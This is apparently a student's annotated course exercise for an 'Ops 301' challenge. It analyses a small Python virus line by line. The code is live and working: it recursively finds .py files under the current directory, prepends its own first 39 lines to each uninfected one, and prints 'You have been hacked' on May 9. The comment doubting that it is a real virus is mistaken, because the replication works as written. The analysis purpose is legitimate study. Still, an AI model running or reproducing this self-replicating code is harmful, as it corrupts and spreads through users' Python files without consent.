#missing shebang

# Script:         Ops 301 Ops Chall 14
# Purpose:        Analyze virus code
# Why:            Good to be able to break code line by line.

import os
import datetime

# Signature of the virus
SIGNATURE = "VIRUS"

# establishes function that recursively searches for all files ending in .py in a given directory and subs
# If a file does not contain the virus signature, it is added to a list of files to infect
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# establish function and opens the virus file and reads the first 39 lines
# adds  code to the beginning of each file in the list of files to infect returned by locate
#I don't think this is an actual virus,but could be one if virus string contained actual code.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

#established function and checks if the current date is May 9th,and prints "You have been hacked" if it is
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Find all Python files in all directories that do not already contain the virus signature
files_targeted = locate(os.path.abspath(""))
#calls on function infect
# Adds virus to the beginning of each file in the list of files to infect
infect(files_targeted)
#calls the function detonate
detonate()